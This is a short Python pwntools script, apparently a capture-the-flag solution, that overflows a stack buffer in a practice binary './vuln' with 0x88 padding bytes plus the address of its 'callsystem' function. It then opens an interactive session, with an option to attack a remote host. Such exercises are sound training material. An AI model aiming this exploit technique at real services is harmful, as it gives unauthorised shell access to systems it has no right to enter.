from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x4005bf
continue
'''.format(**locals())

#Binary filename
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

p.recvuntil(b"Hello, World\n")
p.sendline(b"a" * 0x88 + p64(elf.sym['callsystem'])) 

p.interactive()
